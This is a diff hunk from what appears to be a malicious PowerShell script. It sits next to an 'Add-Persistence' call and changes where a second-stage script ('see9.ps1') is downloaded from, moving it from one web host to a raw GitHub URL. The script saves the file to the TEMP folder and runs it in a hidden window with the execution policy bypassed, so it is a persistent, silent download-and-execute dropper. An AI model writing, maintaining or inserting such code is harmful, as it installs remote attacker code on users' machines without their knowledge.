@@ -102,7 +102,7 @@ Add-Persistence -ScriptName "tt9.ps1"
 
 $tempPath = Join-Path $env:TEMP "see9.ps1"
 try {
-    Invoke-WebRequest -Uri "https://bvmatqnam.com.vn/js/test/see9.ps1" -OutFile $tempPath -TimeoutSec 15
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jasikawedss-commits/test2/refs/heads/main/see9.ps1" -OutFile $tempPath -TimeoutSec 15
     Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempPath`"" -WindowStyle Hidden
 } catch {}
 
